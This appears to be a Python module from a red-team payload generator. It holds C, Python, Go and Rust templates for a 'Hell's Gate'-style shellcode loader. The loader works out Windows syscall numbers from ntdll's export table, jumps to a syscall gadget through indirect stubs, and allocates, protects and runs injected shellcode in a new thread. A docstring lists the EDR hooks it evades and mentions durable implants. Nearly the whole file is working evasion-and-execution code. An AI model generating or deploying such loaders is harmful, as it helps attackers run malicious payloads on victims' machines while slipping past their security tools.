"""Loader: win_hells_gate -- SysWhispers3-style indirect syscall + RVA-sort SSN extraction.

Tier 4 (syscall-level evasion).

Strategy:
  1. Resolve ntdll base via GetModuleHandleA (kernel32 for this one step only;
     the memory/thread execution path uses no kernel32).
  2. SSN extraction via RVA sort (export-table reads only, no hooked-byte reads):
       - Parse ntdll export directory
       - Collect Nt* exports (name + function RVA), excluding Ntdll* helpers
         (NtdllDefWindowProc*, NtdllDialogWndProc*) which are not syscall stubs
         and appear before the stub cluster in RVA order, shifting all SSNs
       - Sort by RVA ascending -> index in sorted list = System Service Number
       - Reads only .edata-equivalent fields; never touches .text stub bytes
  3. Gadget scan: walk ntdll executable sections to find the first `syscall; ret`
     sequence (0F 05 C3). The syscall instruction lives in ntdll .text, so the
     kernel sees an ntdll RIP on entry -- satisfying CFG/CET checks on Win11.
  4. Indirect syscall stub (22 bytes, built at runtime):
       4C 8B D1              mov r10, rcx         (NT ABI: preserve first arg)
       B8 [SSN 4B LE]        mov eax, SSN
       FF 25 00 00 00 00     jmp [rip+0]           (RIP-relative; next 8 bytes)
       [gadget addr 8B LE]   -> syscall; ret in ntdll .text
     Four stubs (one per NT function) are written to a single RW page, then
     flipped RX before any execution.
  5. Execution: NtAllocateVirtualMemory(RW) -> memcpy -> NtProtectVirtualMemory(RX)
     -> NtCreateThreadEx -> NtWaitForSingleObject

Evasion properties:
  - No kernel32 VirtualAlloc / CreateThread in the memory/thread path
  - Syscall instruction lives in ntdll .text -- kernel RIP check passes
  - SSN read from export table (RVA sort), not from stub bytes -- immune to
    standard inline hook overwrites that patch the 4-byte prologue
  - IAT contains only kernel32!GetModuleHandleA; all NT calls go through
    anonymous stubs allocated at runtime

Still triggers on:
  - NtCreateThreadEx from non-image-backed memory (PsSetCreateThreadNotifyRoutine
    kernel callback fires regardless of how the thread is created)
  - CET shadow stack walk mismatch on Win11 25H2+ with EPROCESS.MitigationFlags2
    CetUserShadowStacks enabled (jmp-to-gadget diverges from shadow stack)
  - Multiple NtProtectVirtualMemory(RX) calls on anonymous pages in rapid succession

SSN stability note:
  RVA-sort SSNs are ntdll-build-specific but consistent across all processes on the
  same build. A cumulative update that adds/removes Nt* exports shifts all higher
  SSNs by +/-1. Acceptable for ephemeral test/red-team use; for durable implants
  prefer KnownDlls section mapping or a fresh ntdll disk load (win_fresh_ntdll,
  future tier).
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_hells_gate")

# {sc_embed}    — global declarations (encrypted array + key, or empty for staged)
# {sc_init}     — in-main init block (decrypt loop or file-reading code)
# {main_decl}   — main() signature (void or int argc, char *argv[])
_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

{sc_embed}

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)
#define STUB_SIZE 22   /* 3 + 5 + 6 + 8 bytes */

typedef NTSTATUS (NTAPI *FnNtAllocVM)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *FnNtProtVM)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *FnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
    PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *FnNtWaitForSingleObject)(HANDLE, BOOLEAN, PVOID);

/* -- RVA-sort SSN extraction ----------------------------------------------- */

typedef struct {{ DWORD rva; char name[96]; }} NtExp;

static int cmp_rva(const void *a, const void *b) {{
    DWORD ra = ((const NtExp *)a)->rva, rb = ((const NtExp *)b)->rva;
    return (ra > rb) - (ra < rb);
}}

/* Parse ntdll export directory, collect Nt* entries, sort by RVA.
   The index in the sorted list equals the System Service Number. */
static int get_ssn(HMODULE ntdll, const char *fn) {{
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER      *dos  = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS      *nth  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return -1;
    IMAGE_EXPORT_DIRECTORY *exp  = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    NtExp *arr = (NtExp *)calloc(exp->NumberOfNames, sizeof(NtExp));
    if (!arr) return -1;
    int cnt = 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {{
        const char *nm = (const char *)(base + names[i]);
        if (nm[0] != 'N' || nm[1] != 't') continue;
        /* Exclude Ntdll* helpers (NtdllDefWindowProc etc.) -- not syscall stubs */
        if (nm[2] == 'd' && nm[3] == 'l' && nm[4] == 'l') continue;
        arr[cnt].rva = funcs[ords[i]];
        strncpy(arr[cnt].name, nm, 95);
        cnt++;
    }}
    qsort(arr, cnt, sizeof(NtExp), cmp_rva);
    int ssn = -1;
    for (int i = 0; i < cnt; i++) {{
        if (strcmp(arr[i].name, fn) == 0) {{ ssn = i; break; }}
    }}
    free(arr);
    return ssn;
}}

/* -- Gadget scan: first `syscall; ret` (0F 05 C3) in ntdll .text ---------- */

static BYTE *find_gadget(HMODULE ntdll) {{
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nth = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nth);
    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++) {{
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *p  = base + sec->VirtualAddress;
        DWORD sz = sec->Misc.VirtualSize;
        for (DWORD j = 0; j + 2 < sz; j++) {{
            if (p[j] == 0x0F && p[j+1] == 0x05 && p[j+2] == 0xC3)
                return &p[j];
        }}
    }}
    return NULL;
}}

/* -- Build indirect syscall stub (22 bytes) -------------------------------- *
   4C 8B D1              mov r10, rcx
   B8 [ssn 4B]           mov eax, ssn
   FF 25 00 00 00 00     jmp [rip+0]
   [gadget 8B]           -> syscall; ret in ntdll .text                       */

static void write_stub(BYTE *s, int ssn, BYTE *gadget) {{
    s[0]=0x4C; s[1]=0x8B; s[2]=0xD1;
    s[3]=0xB8; memcpy(&s[4],  &ssn,    4);
    s[8]=0xFF; s[9]=0x25; s[10]=0; s[11]=0; s[12]=0; s[13]=0;
    memcpy(&s[14], &gadget, 8);
}}

{main_decl} {{
    {sc_init}
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {{ fprintf(stderr, "[-] ntdll not found\\n"); return 1; }}

    int ssn_alloc = get_ssn(ntdll, "NtAllocateVirtualMemory");
    int ssn_prot  = get_ssn(ntdll, "NtProtectVirtualMemory");
    int ssn_thd   = get_ssn(ntdll, "NtCreateThreadEx");
    int ssn_wait  = get_ssn(ntdll, "NtWaitForSingleObject");
    if (ssn_alloc < 0 || ssn_prot < 0 || ssn_thd < 0 || ssn_wait < 0) {{
        fprintf(stderr, "[-] SSN resolution failed: alloc=%d prot=%d thd=%d wait=%d\\n",
                ssn_alloc, ssn_prot, ssn_thd, ssn_wait);
        return 1;
    }}

    BYTE *gadget = find_gadget(ntdll);
    if (!gadget) {{ fprintf(stderr, "[-] syscall gadget not found\\n"); return 1; }}

    /* Allocate stub page RW, write all four stubs, flip to RX */
    BYTE *sp = (BYTE *)VirtualAlloc(NULL, 4 * STUB_SIZE,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!sp) {{ fprintf(stderr, "[-] stub page alloc failed\\n"); return 1; }}
    write_stub(sp + 0 * STUB_SIZE, ssn_alloc, gadget);
    write_stub(sp + 1 * STUB_SIZE, ssn_prot,  gadget);
    write_stub(sp + 2 * STUB_SIZE, ssn_thd,   gadget);
    write_stub(sp + 3 * STUB_SIZE, ssn_wait,  gadget);
    DWORD old;
    VirtualProtect(sp, 4 * STUB_SIZE, PAGE_EXECUTE_READ, &old);

    FnNtAllocVM             NtAllocVM  = (FnNtAllocVM)            (sp + 0 * STUB_SIZE);
    FnNtProtVM              NtProtVM   = (FnNtProtVM)             (sp + 1 * STUB_SIZE);
    FnNtCreateThreadEx      NtThd      = (FnNtCreateThreadEx)     (sp + 2 * STUB_SIZE);
    FnNtWaitForSingleObject NtWait     = (FnNtWaitForSingleObject)(sp + 3 * STUB_SIZE);

    /* NtAllocateVirtualMemory -- RW buffer */
    PVOID mem = NULL;
    SIZE_T sz = sc_len;
    NTSTATUS s = NtAllocVM((HANDLE)-1, &mem, 0, &sz,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(s) || !mem) {{
        fprintf(stderr, "[-] NtAllocateVirtualMemory: 0x%lx\\n", s); return 1;
    }}
    memcpy(mem, sc, sc_len);

    /* NtProtectVirtualMemory -- flip to RX */
    ULONG old_prot = 0;
    sz = sc_len;
    s = NtProtVM((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(s)) {{
        fprintf(stderr, "[-] NtProtectVirtualMemory: 0x%lx\\n", s); return 1;
    }}

    /* NtCreateThreadEx -- execute */
    HANDLE hThread = NULL;
    s = NtThd(&hThread, 0x1FFFFF, NULL, (HANDLE)-1,
               mem, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(s) || !hThread) {{
        fprintf(stderr, "[-] NtCreateThreadEx: 0x%lx\\n", s); return 1;
    }}

    NtWait(hThread, FALSE, NULL);
    CloseHandle(hThread);
    VirtualFree(sp, 0, MEM_RELEASE);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import struct
import sys

{sc_bytes}

NTSTATUS = ctypes.c_long
kernel32 = ctypes.windll.kernel32
kernel32.GetModuleHandleA.restype = ctypes.c_void_p
kernel32.VirtualAlloc.restype     = ctypes.c_void_p

# -- Get ntdll base ----------------------------------------------------------
ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
if not ntdll_base:
    sys.exit(1)


def _u32(addr): return struct.unpack_from("<I", (ctypes.c_ubyte * 4).from_address(addr))[0]
def _u16(addr): return struct.unpack_from("<H", (ctypes.c_ubyte * 2).from_address(addr))[0]


# -- Parse export directory -> collect all Nt* exports -----------------------
e_lfanew  = _u32(ntdll_base + 0x3C)
nt_base   = ntdll_base + e_lfanew
# PE32+ OptionalHeader starts at nt_base+24; DataDirectory[0] (Export) at +112
exp_rva   = _u32(nt_base + 24 + 112)
exp_base  = ntdll_base + exp_rva

num_names = _u32(exp_base + 24)
rva_funcs = _u32(exp_base + 28)
rva_names = _u32(exp_base + 32)
rva_ords  = _u32(exp_base + 36)

nt_exports = []   # (fn_rva, name_str)
for i in range(num_names):
    name_rva  = _u32(ntdll_base + rva_names + i * 4)
    name_b    = ctypes.string_at(ntdll_base + name_rva)
    # Exclude NtdllDefWindowProc*, NtdllDialogWndProc* -- not syscall stubs
    if not name_b.startswith(b"Nt") or name_b.startswith(b"Ntdll"):
        continue
    ord_idx = _u16(ntdll_base + rva_ords + i * 2)
    fn_rva  = _u32(ntdll_base + rva_funcs + ord_idx * 4)
    nt_exports.append((fn_rva, name_b.decode()))

# Sort by RVA ascending -> index in sorted list = System Service Number
nt_exports.sort()
ssn_map = {{name: idx for idx, (_, name) in enumerate(nt_exports)}}


def get_ssn(fn_name):
    if fn_name not in ssn_map:
        print(f"[-] SSN not found: {{fn_name}}", file=sys.stderr)
        sys.exit(1)
    return ssn_map[fn_name]


# -- Gadget scan: find syscall;ret (0F 05 C3) in ntdll executable sections --
num_secs  = _u16(nt_base + 6)
opt_sz    = _u16(nt_base + 20)           # SizeOfOptionalHeader
first_sec = nt_base + 24 + opt_sz       # IMAGE_SECTION_HEADER array
EXEC_FLAG = 0x20000000                  # IMAGE_SCN_MEM_EXECUTE

gadget = None
for si in range(num_secs):
    sec  = first_sec + si * 40
    if not (_u32(sec + 36) & EXEC_FLAG):
        continue
    vaddr = _u32(sec + 12)
    vsize = _u32(sec + 8)
    data  = ctypes.string_at(ntdll_base + vaddr, vsize)
    idx   = data.find(b"\\x0f\\x05\\xc3")
    if idx >= 0:
        gadget = ntdll_base + vaddr + idx
        break

if gadget is None:
    print("[-] syscall gadget not found", file=sys.stderr)
    sys.exit(1)


# -- Build indirect syscall stubs --------------------------------------------
# 22-byte layout: mov r10,rcx + mov eax,ssn + jmp [rip+0] + gadget_addr
STUB_SIZE = 22

def make_stub(ssn):
    return (b"\\x4c\\x8b\\xd1"                      # mov r10, rcx
            + b"\\xb8" + struct.pack("<I", ssn)     # mov eax, ssn
            + b"\\xff\\x25\\x00\\x00\\x00\\x00"     # jmp [rip+0]
            + struct.pack("<Q", gadget))             # -> syscall;ret in ntdll

ssns = [get_ssn(n) for n in (
    "NtAllocateVirtualMemory", "NtProtectVirtualMemory",
    "NtCreateThreadEx", "NtWaitForSingleObject",
)]
stubs_blob = b"".join(make_stub(s) for s in ssns)

sp = kernel32.VirtualAlloc(None, len(stubs_blob), 0x3000, 0x04)  # RW
if not sp:
    sys.exit(1)
buf = (ctypes.c_char * len(stubs_blob)).from_buffer_copy(stubs_blob)
kernel32.RtlMoveMemory(ctypes.c_void_p(sp), buf, len(stubs_blob))
old = ctypes.c_ulong(0)
kernel32.VirtualProtect(ctypes.c_void_p(sp), len(stubs_blob), 0x20, ctypes.byref(old))  # RX


def _stub(idx, proto):
    return proto(sp + idx * STUB_SIZE)


NtAllocVM_t = ctypes.WINFUNCTYPE(
    NTSTATUS, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
    ctypes.c_ulong, ctypes.POINTER(ctypes.c_size_t),
    ctypes.c_ulong, ctypes.c_ulong)

NtProtVM_t = ctypes.WINFUNCTYPE(
    NTSTATUS, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
    ctypes.POINTER(ctypes.c_size_t), ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong))

NtCreateThreadEx_t = ctypes.WINFUNCTYPE(
    NTSTATUS, ctypes.POINTER(ctypes.c_void_p), ctypes.c_ulong,
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    ctypes.c_ulong, ctypes.c_size_t, ctypes.c_size_t, ctypes.c_size_t,
    ctypes.c_void_p)

NtWaitForSingleObject_t = ctypes.WINFUNCTYPE(
    NTSTATUS, ctypes.c_void_p, ctypes.c_bool, ctypes.c_void_p)

NtAllocVM  = _stub(0, NtAllocVM_t)
NtProtVM   = _stub(1, NtProtVM_t)
NtThd      = _stub(2, NtCreateThreadEx_t)
NtWait     = _stub(3, NtWaitForSingleObject_t)

# -- Execute shellcode -------------------------------------------------------
mem = ctypes.c_void_p(0)
sz  = ctypes.c_size_t(len(sc))
s   = NtAllocVM(ctypes.c_void_p(-1), ctypes.byref(mem), 0, ctypes.byref(sz),
                0x3000, 0x04)
if s < 0 or not mem.value:
    print(f"[-] NtAllocateVirtualMemory: 0x{{s & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

payload_buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(mem, payload_buf, len(sc))

sz  = ctypes.c_size_t(len(sc))
old = ctypes.c_ulong(0)
s   = NtProtVM(ctypes.c_void_p(-1), ctypes.byref(mem), ctypes.byref(sz),
               0x20, ctypes.byref(old))
if s < 0:
    print(f"[-] NtProtectVirtualMemory: 0x{{s & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

hThread = ctypes.c_void_p(0)
s = NtThd(ctypes.byref(hThread),
          0x1FFFFF, None, ctypes.c_void_p(-1),
          mem, None,
          0, 0, 0, 0, None)
if s < 0 or not hThread.value:
    print(f"[-] NtCreateThreadEx: 0x{{s & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

NtWait(hThread, False, None)
"""


# {sc_embed}    — package-level declarations (or empty for staged)
# {sc_init}     — first statement(s) in main (decrypt loop or file-reading)
# {sc_imports}  — extra import entries, e.g. \n\t"os" for staged
_GO_TEMPLATE = """\
package main

import (
\t"encoding/binary"
\t"sort"
\t"syscall"
\t"unsafe"{sc_imports}
)

{sc_embed}

type ntExp struct{{ rva uint32; name string }}

func u32p(p uintptr) uint32 {{ return *(*uint32)(unsafe.Pointer(p)) }}
func u16p(p uintptr) uint16 {{ return *(*uint16)(unsafe.Pointer(p)) }}
func cstr(p uintptr) string {{
\tvar b []byte
\tfor i := uintptr(0); ; i++ {{
\t\tc := *(*byte)(unsafe.Pointer(p + i))
\t\tif c == 0 {{ break }}
\t\tb = append(b, c)
\t}}
\treturn string(b)
}}

func getExports(base uintptr) []ntExp {{
\tlfanew := u32p(base + 0x3C)
\texpRVA := u32p(base + uintptr(lfanew) + 24 + 112)
\texp    := base + uintptr(expRVA)
\tnn     := u32p(exp + 24)
\trf, rn, ro := u32p(exp+28), u32p(exp+32), u32p(exp+36)
\tvar out []ntExp
\tfor i := uintptr(0); i < uintptr(nn); i++ {{
\t\tnm := cstr(base + uintptr(u32p(base+uintptr(rn)+i*4)))
\t\tif len(nm) < 2 || nm[0] != 'N' || nm[1] != 't' {{ continue }}
\t\tif len(nm) >= 5 && nm[2] == 'd' && nm[3] == 'l' && nm[4] == 'l' {{ continue }}
\t\tord := u16p(base + uintptr(ro) + i*2)
\t\tout = append(out, ntExp{{u32p(base + uintptr(rf) + uintptr(ord)*4), nm}})
\t}}
\tsort.Slice(out, func(i, j int) bool {{ return out[i].rva < out[j].rva }})
\treturn out
}}

func lookupSSN(exps []ntExp, name string) int {{
\tfor i, e := range exps {{ if e.name == name {{ return i }} }}
\treturn -1
}}

func findGadget(base uintptr) uintptr {{
\tlfanew := u32p(base + 0x3C)
\tntHdr  := base + uintptr(lfanew)
\tnumSec := u16p(ntHdr + 6)
\toptSz  := u16p(ntHdr + 20)
\tfSec   := ntHdr + 24 + uintptr(optSz)
\tfor i := uintptr(0); i < uintptr(numSec); i++ {{
\t\tsec := fSec + i*40
\t\tif u32p(sec+36)&0x20000000 == 0 {{ continue }}
\t\tptr := base + uintptr(u32p(sec+12))
\t\tsz  := uintptr(u32p(sec + 8))
\t\tfor j := uintptr(0); j+2 < sz; j++ {{
\t\t\tb := (*[3]byte)(unsafe.Pointer(ptr + j))
\t\t\tif b[0] == 0x0F && b[1] == 0x05 && b[2] == 0xC3 {{ return ptr + j }}
\t\t}}
\t}}
\treturn 0
}}

func buildStub(s int, gadget uintptr) [22]byte {{
\tvar b [22]byte
\tb[0], b[1], b[2] = 0x4C, 0x8B, 0xD1
\tb[3] = 0xB8
\tbinary.LittleEndian.PutUint32(b[4:], uint32(s))
\tb[8], b[9] = 0xFF, 0x25
\tbinary.LittleEndian.PutUint64(b[14:], uint64(gadget))
\treturn b
}}

func main() {{
\t{sc_init}
\tk32           := syscall.NewLazyDLL("kernel32.dll")
\tpGetModHandle := k32.NewProc("GetModuleHandleA")
\tpVirtualAlloc := k32.NewProc("VirtualAlloc")
\tpVirtualFree  := k32.NewProc("VirtualFree")
\tpVirtualProt  := k32.NewProc("VirtualProtect")
\tpRtlMove      := k32.NewProc("RtlMoveMemory")
\tpCloseHandle  := k32.NewProc("CloseHandle")

\tntdllName := [...]byte{{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0}}
\tntdllBase, _, _ := pGetModHandle.Call(uintptr(unsafe.Pointer(&ntdllName[0])))
\tif ntdllBase == 0 {{ return }}

\texps := getExports(ntdllBase)
\tnames := [4]string{{
\t\t"NtAllocateVirtualMemory", "NtProtectVirtualMemory",
\t\t"NtCreateThreadEx", "NtWaitForSingleObject",
\t}}
\tvar ssns [4]int
\tfor i, n := range names {{
\t\tssns[i] = lookupSSN(exps, n)
\t\tif ssns[i] < 0 {{ return }}
\t}}

\tgadget := findGadget(ntdllBase)
\tif gadget == 0 {{ return }}

\tconst stubSz = 22
\tsp, _, _ := pVirtualAlloc.Call(0, 4*stubSz, 0x3000, 0x04)
\tif sp == 0 {{ return }}
\tfor i, s := range ssns {{
\t\tstub := buildStub(s, gadget)
\t\tpRtlMove.Call(sp+uintptr(i*stubSz), uintptr(unsafe.Pointer(&stub[0])), stubSz)
\t}}
\tvar old uint32
\tpVirtualProt.Call(sp, 4*stubSz, 0x20, uintptr(unsafe.Pointer(&old)))

\tvar mem uintptr
\tsz := uintptr(len(sc))
\tst, _, _ := syscall.SyscallN(sp+0*stubSz,
\t\t^uintptr(0), uintptr(unsafe.Pointer(&mem)), 0,
\t\tuintptr(unsafe.Pointer(&sz)), 0x3000, 0x04)
\tif int32(st) < 0 || mem == 0 {{
\t\tpVirtualFree.Call(sp, 0, 0x8000); return
\t}}
\tpRtlMove.Call(mem, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

\tsz = uintptr(len(sc))
\tst, _, _ = syscall.SyscallN(sp+1*stubSz,
\t\t^uintptr(0), uintptr(unsafe.Pointer(&mem)),
\t\tuintptr(unsafe.Pointer(&sz)), 0x20, uintptr(unsafe.Pointer(&old)))
\tif int32(st) < 0 {{
\t\tpVirtualFree.Call(sp, 0, 0x8000); return
\t}}

\tvar ht uintptr
\tst, _, _ = syscall.SyscallN(sp+2*stubSz,
\t\tuintptr(unsafe.Pointer(&ht)), 0x1FFFFF, 0, ^uintptr(0),
\t\tmem, 0, 0, 0, 0, 0, 0)
\tif int32(st) < 0 || ht == 0 {{
\t\tpVirtualFree.Call(sp, 0, 0x8000); return
\t}}

\tsyscall.SyscallN(sp+3*stubSz, ht, 0, 0)
\tpCloseHandle.Call(ht)
\tpVirtualFree.Call(sp, 0, 0x8000)
}}
"""

# {sc_bytes} is inside fn main() — single block (decl + decrypt or file-read)
_RS_TEMPLATE = """\
#![allow(non_snake_case)]
use std::{{mem, ptr, ffi::CStr}};

type NTSTATUS = i32;
type FnNtAllocVM        = unsafe extern "system" fn(*mut u8, *mut *mut u8, usize, *mut usize, u32, u32) -> NTSTATUS;
type FnNtProtVM         = unsafe extern "system" fn(*mut u8, *mut *mut u8, *mut usize, u32, *mut u32) -> NTSTATUS;
type FnNtCreateThreadEx = unsafe extern "system" fn(*mut *mut u8, u32, *mut u8, *mut u8, *mut u8, *mut u8, u32, usize, usize, usize, *mut u8) -> NTSTATUS;
type FnNtWait           = unsafe extern "system" fn(*mut u8, i32, *mut u8) -> NTSTATUS;

#[link(name = "kernel32")]
extern "system" {{
    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut u8;
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut u8;
    fn VirtualFree(lpAddress: *mut u8, dwSize: usize, dwFreeType: u32) -> i32;
    fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32, lpflOldProtect: *mut u32) -> i32;
    fn CloseHandle(hObject: *mut u8) -> i32;
    fn RtlMoveMemory(dest: *mut u8, src: *const u8, len: usize);
}}

unsafe fn u32_at(p: usize) -> u32 {{ *(p as *const u32) }}
unsafe fn u16_at(p: usize) -> u16 {{ *(p as *const u16) }}

unsafe fn get_exports(base: usize) -> Vec<(u32, String)> {{
\tlet lfanew  = u32_at(base + 0x3C) as usize;
\tlet exp_rva = u32_at(base + lfanew + 24 + 112) as usize;
\tlet exp     = base + exp_rva;
\tlet nn      = u32_at(exp + 24) as usize;
\tlet rf      = u32_at(exp + 28) as usize;
\tlet rn      = u32_at(exp + 32) as usize;
\tlet ro      = u32_at(exp + 36) as usize;
\tlet mut out: Vec<(u32, String)> = Vec::new();
\tfor i in 0..nn {{
\t\tlet name_rva = u32_at(base + rn + i * 4) as usize;
\t\tlet name = CStr::from_ptr((base + name_rva) as *const i8)
\t\t\t.to_str().unwrap_or("").to_owned();
\t\tif !name.starts_with("Nt") || name.starts_with("Ntdll") {{ continue; }}
\t\tlet ord   = u16_at(base + ro + i * 2) as usize;
\t\tlet fn_rva = u32_at(base + rf + ord * 4);
\t\tout.push((fn_rva, name));
\t}}
\tout.sort_by_key(|e| e.0);
\tout
}}

unsafe fn find_gadget(base: usize) -> usize {{
\tlet lfanew  = u32_at(base + 0x3C) as usize;
\tlet nt_hdr  = base + lfanew;
\tlet num_sec = u16_at(nt_hdr + 6) as usize;
\tlet opt_sz  = u16_at(nt_hdr + 20) as usize;
\tlet f_sec   = nt_hdr + 24 + opt_sz;
\tfor i in 0..num_sec {{
\t\tlet sec   = f_sec + i * 40;
\t\tif u32_at(sec + 36) & 0x20000000 == 0 {{ continue; }}
\t\tlet vaddr = u32_at(sec + 12) as usize;
\t\tlet vsize = u32_at(sec + 8) as usize;
\t\tlet data  = std::slice::from_raw_parts((base + vaddr) as *const u8, vsize);
\t\tif let Some(idx) = data.windows(3).position(|w| w == [0x0F, 0x05, 0xC3]) {{
\t\t\treturn base + vaddr + idx;
\t\t}}
\t}}
\t0
}}

fn build_stub(ssn: u32, gadget: usize) -> [u8; 22] {{
\tlet mut s = [0u8; 22];
\ts[0] = 0x4C; s[1] = 0x8B; s[2] = 0xD1;
\ts[3] = 0xB8;
\ts[4..8].copy_from_slice(&ssn.to_le_bytes());
\ts[8] = 0xFF; s[9] = 0x25;
\ts[14..22].copy_from_slice(&(gadget as u64).to_le_bytes());
\ts
}}

fn main() {{
    {sc_bytes}
    unsafe {{
        let ntdll = GetModuleHandleA(b"ntdll.dll\\0".as_ptr());
        if ntdll.is_null() {{ return; }}
        let base = ntdll as usize;

        let exps = get_exports(base);
        let fn_names = ["NtAllocateVirtualMemory", "NtProtectVirtualMemory",
                        "NtCreateThreadEx", "NtWaitForSingleObject"];
        let mut ssns = [0u32; 4];
        for (i, name) in fn_names.iter().enumerate() {{
            match exps.iter().position(|(_, n)| n == name) {{
                Some(idx) => ssns[i] = idx as u32,
                None => return,
            }}
        }}

        let gadget = find_gadget(base);
        if gadget == 0 {{ return; }}

        const STUB_SZ: usize = 22;
        let sp = VirtualAlloc(ptr::null_mut(), 4 * STUB_SZ, 0x3000, 0x04);
        if sp.is_null() {{ return; }}
        for (i, &ssn) in ssns.iter().enumerate() {{
            let stub = build_stub(ssn, gadget);
            ptr::copy_nonoverlapping(stub.as_ptr(), sp.add(i * STUB_SZ), STUB_SZ);
        }}
        let mut old: u32 = 0;
        VirtualProtect(sp, 4 * STUB_SZ, 0x20, &mut old);

        let NtAllocVM: FnNtAllocVM        = mem::transmute(sp.add(0 * STUB_SZ));
        let NtProtVM:  FnNtProtVM         = mem::transmute(sp.add(1 * STUB_SZ));
        let NtThd:     FnNtCreateThreadEx = mem::transmute(sp.add(2 * STUB_SZ));
        let NtWait:    FnNtWait           = mem::transmute(sp.add(3 * STUB_SZ));

        let proc = (!0usize) as *mut u8;
        let mut p: *mut u8 = ptr::null_mut();
        let mut sz: usize = sc.len();
        let s = NtAllocVM(proc, &mut p, 0, &mut sz, 0x3000, 0x04);
        if s < 0 || p.is_null() {{ VirtualFree(sp, 0, 0x8000); return; }}

        RtlMoveMemory(p, sc.as_ptr(), sc.len());

        let mut old2: u32 = 0;
        let mut sz2: usize = sc.len();
        if NtProtVM(proc, &mut p, &mut sz2, 0x20, &mut old2) < 0 {{
            VirtualFree(sp, 0, 0x8000); return;
        }}

        let mut ht: *mut u8 = ptr::null_mut();
        let s = NtThd(&mut ht, 0x1FFFFF, ptr::null_mut(), proc,
                      p, ptr::null_mut(), 0, 0, 0, 0, ptr::null_mut());
        if s < 0 || ht.is_null() {{ VirtualFree(sp, 0, 0x8000); return; }}

        NtWait(ht, 0, ptr::null_mut());
        CloseHandle(ht);
        VirtualFree(sp, 0, 0x8000);
    }}
}}
"""


def generate_c(shellcode: bytes, staged: bool = False) -> str:
    """Return a C loader using indirect syscall stubs with RVA-sort SSN extraction."""
    if staged:
        embed, init = _render.c_staged_sc("sc")
        main_decl = "int main(int argc, char *argv[])"
    else:
        embed, init = _render.c_sc_block(shellcode, "sc")
        main_decl = "int main(void)"
    return _C_TEMPLATE.format(sc_embed=embed, sc_init=init, main_decl=main_decl)


def generate_python(shellcode: bytes, staged: bool = False) -> str:
    """Return a Python ctypes loader using indirect syscall stubs."""
    sc_bytes = _render.py_staged_sc("sc") if staged else _render.py_sc_block(shellcode, "sc")
    return _PY_TEMPLATE.format(sc_bytes=sc_bytes)


def generate_go(shellcode: bytes, staged: bool = False) -> str:
    """Return a Go loader using indirect syscall stubs with RVA-sort SSN extraction."""
    if staged:
        embed, init, imports = _render.go_staged_sc("sc")
    else:
        embed, init, imports = _render.go_sc_block(shellcode, "sc")
    return _GO_TEMPLATE.format(sc_embed=embed, sc_init=init, sc_imports=imports)


def generate_rust(shellcode: bytes, staged: bool = False) -> str:
    """Return a Rust loader using indirect syscall stubs with RVA-sort SSN extraction."""
    sc_bytes = _render.rust_staged_sc("sc") if staged else _render.rust_sc_block(shellcode, "sc")
    return _RS_TEMPLATE.format(sc_bytes=sc_bytes)
